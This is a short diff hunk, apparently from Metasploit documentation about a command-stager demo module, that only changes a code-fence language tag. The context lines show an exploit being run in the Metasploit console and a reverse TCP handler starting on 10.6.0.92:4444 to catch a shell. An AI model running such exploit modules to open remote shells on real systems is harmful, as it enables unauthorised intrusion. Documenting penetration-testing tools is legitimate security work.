@@ -187,7 +187,7 @@ end
 And let's run that, we should have a shell:
 
 
-```
+```msf
 msf exploit(cmdstager_demo) > run
 
 [*] Started reverse TCP handler on 10.6.0.92:4444 
